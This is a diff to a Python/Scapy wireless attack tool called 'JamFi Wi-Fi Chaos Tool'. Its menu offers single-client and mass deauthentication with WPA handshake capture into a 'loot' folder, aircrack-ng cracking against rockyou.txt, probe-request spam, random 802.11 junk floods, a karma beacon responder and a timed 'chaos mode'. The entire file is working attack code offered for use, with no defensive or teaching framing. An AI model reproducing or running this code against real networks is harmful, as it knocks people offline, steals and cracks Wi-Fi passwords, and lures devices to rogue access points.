@@ -2,6 +2,7 @@
 import os
 import sys
 import time
+import json
 import subprocess
 from scapy.all import *
 from threading import Thread
@@ -9,14 +10,13 @@ from random import choice, randint
 
 seen_aps = {}
 clients = {}
+scan_results = {}
 
-# Sample vendor MAC prefixes
 vendor_prefixes = [
     "00:11:22", "00:0C:29", "D8:96:95", "F4:5C:89", "3C:5A:B4",
     "B8:27:EB", "8C:85:90", "40:B0:34", "A4:5E:60", "E0:3F:49"
 ]
 
-# 🌸 JamFi Banner
 def print_banner():
     print(r"""
      ██╗ █████╗ ███╗   ███╗        ███████╗██╗
@@ -25,182 +25,205 @@ def print_banner():
 ██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
 ╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
  ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝
-
          💜  JamFi Wi-Fi Chaos Tool  💜
-      👩‍💻  Author: ekoms savior
-      📡  Like Spam Jam — but wireless!
 """)
 
-# 📡 Channel Hopper
 def channel_hopper(iface):
     while True:
         for ch in range(1, 14):
             os.system(f"iwconfig {iface} channel {ch}")
-            time.sleep(0.5)
+            time.sleep(0.3)
 
-# 📶 Packet Handler for Client Scan
 def packet_handler(pkt):
     if pkt.haslayer(Dot11Beacon):
         bssid = pkt[Dot11].addr3
-        ssid = pkt[Dot11Elt].info.decode(errors='ignore')
+        ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "<Hidden SSID>"
         if bssid not in seen_aps:
             seen_aps[bssid] = ssid
+            scan_results[bssid] = {"ssid": ssid, "clients": []}
             print(f"📶 AP: {ssid:<25} BSSID: {bssid}")
 
-    if pkt.haslayer(Dot11):
-        if pkt.type == 2:
-            src = pkt.addr2
-            dst = pkt.addr1
-            bssid = pkt.addr3
-            if bssid in seen_aps and src != bssid:
-                if src not in clients:
-                    clients[src] = bssid
-                    print(f"💡 Client: {src} -> AP: {seen_aps[bssid]}")
+    if pkt.haslayer(Dot11) and pkt.type == 2:
+        src = pkt.addr2
+        bssid = pkt.addr3
+        if bssid in seen_aps and src != bssid and src not in clients:
+            clients[src] = bssid
+            scan_results[bssid]["clients"].append(src)
+            print(f"    💡 Client: {src} -> {seen_aps[bssid]}")
 
-# 🔍 Client Scanner
 def scan_clients():
     iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
     if not iface:
         print("⚠️ Interface not entered.")
         return
-
-    print("📡 Scanning for clients and APs...\n")
+    print("📡 Scanning for clients and APs... (CTRL+C to stop)\n")
     Thread(target=channel_hopper, args=(iface,), daemon=True).start()
-    sniff(iface=iface, prn=packet_handler, store=0)
+    try:
+        sniff(iface=iface, prn=packet_handler, store=0)
+    except KeyboardInterrupt:
+        print("✅ Scan stopped.")
 
-# 💾 EAPOL Handshake Sniffer
-def capture_handshake(iface, target_bssid):
+def capture_handshake(iface, bssid):
     os.makedirs("loot", exist_ok=True)
-    file_path = f"loot/handshake_{target_bssid.replace(':', '')}.pcap"
-    print(f"📡 Sniffing for EAPOL handshakes to {target_bssid}... Saving to {file_path}")
-
-    def eapol_filter(pkt):
-        return pkt.haslayer(EAPOL) and pkt.haslayer(Dot11) and pkt.addr2 == target_bssid
-
-    packets = sniff(iface=iface, lfilter=eapol_filter, timeout=30)
-    if packets:
-        wrpcap(file_path, packets)
-        print(f"✅ Handshake captured and saved to {file_path} 💾")
+    path = f"loot/handshake_{bssid.replace(':','')}.pcap"
+    print(f"📡 Capturing handshake to {bssid}, saving to {path}")
+    def eapol(pkt): return pkt.haslayer(EAPOL) and pkt.addr2 == bssid
+    pkts = sniff(iface=iface, lfilter=eapol, timeout=30)
+    if pkts:
+        wrpcap(path, pkts)
+        print(f"✅ Saved handshake to {path}")
     else:
         print("⚠️ No handshake captured.")
 
-# 💥 Deauth Attack (with toggle for handshake capture)
 def deauth_attack():
-    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
-    target = input("💜 Target Client MAC Address (STA): ").strip()
-    ap = input("💜 Access Point MAC Address (BSSID): ").strip()
-    try:
-        count = int(input("💜 Number of deauth packets to send (e.g. 1000): "))
-        interval = float(input("💜 Time between packets (e.g. 0.05): "))
-    except ValueError:
-        print("⚠️ Invalid count or interval.")
-        return
-
-    mode = input("💜 Capture handshake too? (1 = just deauth, 2 = deauth + handshake): ").strip()
-
-    if mode == "2":
-        t = Thread(target=capture_handshake, args=(iface, ap))
-        t.start()
+    iface = input("💜 Monitor mode interface: ").strip()
+    target = input("💜 Target Client MAC: ").strip()
+    ap = input("💜 Access Point MAC: ").strip()
+    count = int(input("💜 Number of packets: ") or 100)
+    delay = float(input("💜 Delay between packets: ") or 0.05)
+    capture = input("💜 Capture handshake? (y/n): ").strip().lower()
+    if capture == "y":
+        Thread(target=capture_handshake, args=(iface, ap)).start()
         time.sleep(2)
+    frame = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
+    sendp(frame, iface=iface, count=count, inter=delay)
+    print("✅ Deauth complete!")
 
-    dot11 = Dot11(addr1=target, addr2=ap, addr3=ap)
-    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
-    print(f"\n🚀 Sending {count} deauth packets to {target} from {ap} via {iface}...\n")
-    sendp(frame, iface=iface, count=count, inter=interval, verbose=1)
-    print("✅ Deauth complete!\n")
-
-# 🔥 Enhanced Junk Packet Flood
-def junk_flood():
-    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
-    try:
-        count = int(input("💜 Number of junk packets to send (e.g. 1000): "))
-        interval = float(input("💜 Time between packets (e.g. 0.01): "))
-    except ValueError:
-        print("⚠️ Invalid input.")
+def deauth_all():
+    iface = input("💜 Monitor mode interface: ").strip()
+    if not scan_results:
+        print("⚠️ Run scan first!")
         return
+    count = int(input("💜 Number of packets per client (default 100): ") or 100)
+    delay = float(input("💜 Delay between packets (default 0.05): ") or 0.05)
+    print("💥 Deauthing all clients and sniffing handshakes...\n")
+    for bssid, data in scan_results.items():
+        Thread(target=capture_handshake, args=(iface, bssid), daemon=True).start()
+        for client in data["clients"]:
+            frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
+            sendp(frame, iface=iface, count=count, inter=delay, verbose=0)
+            print(f"🚀 Deauthed {client} from {data['ssid']}")
 
-    print("💥 Sending enhanced junk 802.11 packets with randomized subtypes and vendor MACs...")
+def crack_handshakes():
+    loot_dir = "loot"
+    if not os.path.exists(loot_dir):
+        print("⚠️ Loot folder not found.")
+        return
+    pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
+    if not pcaps:
+        print("⚠️ No handshake files found.")
+        return
+    for i, p in enumerate(pcaps):
+        print(f"{i+1}. {p}")
+    try:
+        idx = int(input("💜 Choose file number: ")) - 1
+        pcap = os.path.join(loot_dir, pcaps[idx])
+    except:
+        print("⚠️ Invalid selection.")
+        return
+    wordlist = input("📚 Wordlist (default rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
+    if not os.path.isfile(wordlist):
+        print("❌ Wordlist not found!")
+        return
+    print("✨ Cracking the handshake like it’s a mystery in a teen drama... 🔍")
+    os.system(f"aircrack-ng {pcap} -w {wordlist}")
 
-    subtype_choices = [0, 4, 5, 8]  # assoc_req, probe_req, probe_resp, beacon
+def probe_spammer():
+    iface = input("💜 Monitor mode interface: ").strip()
+    ssids = ["FreeWiFi", "HackThePlanet", "Xfinitywifi", "Starbucks_Guest"]
+    count = int(input("💜 Number of probes: ") or 500)
+    delay = float(input("💜 Delay: ") or 0.01)
+    for _ in range(count):
+        ssid = choice(ssids)
+        pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
+                addr2=RandMAC(), addr3="ff:ff:ff:ff:ff:ff")/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
+        sendp(pkt, iface=iface, verbose=0)
+        time.sleep(delay)
+    print("✅ Probe spam done!")
 
+def junk_flood():
+    iface = input("💜 Monitor mode interface: ").strip()
+    count = int(input("💜 Number of packets: ") or 1000)
+    delay = float(input("💜 Delay: ") or 0.01)
+    types = [0, 4, 5, 8]
     for _ in range(count):
         prefix = choice(vendor_prefixes)
-        suffix = ":".join([f"%02x" % randint(0x00, 0xFF) for _ in range(3)])
-        src_mac = f"{prefix}:{suffix}"
-        dst_mac = RandMAC()
-        subtype = choice(subtype_choices)
-
-        pkt = RadioTap()/Dot11(type=0, subtype=subtype, addr1=dst_mac, addr2=src_mac, addr3=src_mac)/Raw(load=os.urandom(64))
+        suffix = ":".join([f"%02x" % randint(0, 255) for _ in range(3)])
+        src = f"{prefix}:{suffix}"
+        dst = RandMAC()
+        subtype = choice(types)
+        pkt = RadioTap()/Dot11(type=0, subtype=subtype, addr1=dst,
+            addr2=src, addr3=src)/Raw(load=os.urandom(64))
         sendp(pkt, iface=iface, verbose=0)
-        time.sleep(interval)
+        time.sleep(delay)
+    print("✅ Junk flood complete!")
 
-    print("✅ Junk flood complete! 💣")
-
-# 📡 Probe Request Spammer
-def probe_spammer():
-    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
-    try:
-        count = int(input("💜 Number of probe requests to send (e.g. 1000): "))
-        interval = float(input("💜 Time between packets (e.g. 0.01): "))
-    except ValueError:
-        print("⚠️ Invalid input.")
-        return
-
-    ssid_list = ["FreeWiFi", "HomeNetwork", "HackThePlanet", "Starbucks_Guest", "Xfinitywifi"]
-    print("📡 Spamming probe requests with fake SSIDs...")
-
-    for _ in range(count):
-        ssid = choice(ssid_list)
-        src_mac = RandMAC()
-        pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3="ff:ff:ff:ff:ff:ff")/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
-        sendp(pkt, iface=iface, verbose=0)
-        time.sleep(interval)
-
-    print("✅ Probe request spam complete! 📡")
-
-# 🧲 Karma Responder (Passive)
 def karma_responder():
-    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
-    print("🧲 Listening for probe requests and responding with matching beacons...")
-
+    iface = input("💜 Monitor mode interface: ").strip()
+    print("🧲 Listening for probe requests...")
     def respond(pkt):
         if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
             ssid = pkt[Dot11Elt].info.decode(errors='ignore')
             if ssid:
-                src_mac = RandMAC()
-                beacon = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=src_mac)/Dot11Beacon()/Dot11Elt(ID=0, info=ssid)/Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
+                beacon = RadioTap()/Dot11(type=0, subtype=8,
+                    addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon()/Dot11Elt(ID=0, info=ssid)
                 sendp(beacon, iface=iface, count=1, verbose=0)
                 print(f"🧲 Responded to probe for SSID: {ssid}")
-
     sniff(iface=iface, prn=respond, store=0)
 
-# 🏁 Menu
+def chaos_mode():
+    print("💃 entering CHAOS DANCE MODE 💃")
+    iface = input("💜 Monitor mode interface: ").strip()
+    end = time.time() + 60
+    while time.time() < end:
+        probe_spammer()
+        junk_flood()
+        time.sleep(2)
+    print("💥 Chaos mode complete!")
+
+def evil_ap():
+    print("👿 Evil AP coming soon! Will mimic target SSID with optional portal.")
+
+def loot_viewer():
+    loot_dir = "loot"
+    if not os.path.exists(loot_dir):
+        print("⚠️ No loot yet.")
+        return
+    for f in os.listdir(loot_dir):
+        print(f"📁 {f}")
+
+# 💫 Menu
 def main():
     print_banner()
     while True:
-        print("\n🔹 1️⃣  Scan Connected Clients 🔍")
-        print("🔹 2️⃣  Deauth Attack 💥")
-        print("🔹 3️⃣  Junk Packet Flood 💣")
-        print("🔹 4️⃣  Probe Request Spam 📡")
-        print("🔹 5️⃣  Karma Responder 🧲")
-        print("🔹 6️⃣  Quit ❌")
-        choice = input("💜 Choose an option (1-6): ").strip()
+        print("\n🔹 1️⃣  Scan Clients & APs 🔍")
+        print("🔹 2️⃣  Deauth One Client 💥")
+        print("🔹 3️⃣  Deauth ALL Clients + Capture 🔓")
+        print("🔹 4️⃣  Crack Captured Handshakes 🔓")
+        print("🔹 5️⃣  Probe Request Spam 📡")
+        print("🔹 6️⃣  Junk Packet Flood 💣")
+        print("🔹 7️⃣  Karma Responder 🧲")
+        print("🔹 8️⃣  Chaos Mode 💃")
+        print("🔹 9️⃣  View Loot 📁")
+        print("🔹 🔟  Evil AP 👿")
+        print("🔹 0️⃣  Quit ❌")
+        choice = input("💜 Choose an option: ").strip()
 
-        if choice == "1":
-            scan_clients()
-        elif choice == "2":
-            deauth_attack()
-        elif choice == "3":
-            junk_flood()
-        elif choice == "4":
-            probe_spammer()
-        elif choice == "5":
-            karma_responder()
-        elif choice == "6":
-            print("👋 Goodbye, fren! Stay spicy! 💜")
+        if choice == "1": scan_clients()
+        elif choice == "2": deauth_attack()
+        elif choice == "3": deauth_all()
+        elif choice == "4": crack_handshakes()
+        elif choice == "5": probe_spammer()
+        elif choice == "6": junk_flood()
+        elif choice == "7": karma_responder()
+        elif choice == "8": chaos_mode()
+        elif choice == "9": loot_viewer()
+        elif choice == "10": evil_ap()
+        elif choice == "0":
+            print("👋 Goodbye fren! XOXOXO 💜")
             sys.exit()
         else:
-            print("⚠️ Invalid choice. Try again!\n")
+            print("⚠️ Invalid choice!")
 
 if __name__ == "__main__":
     main()
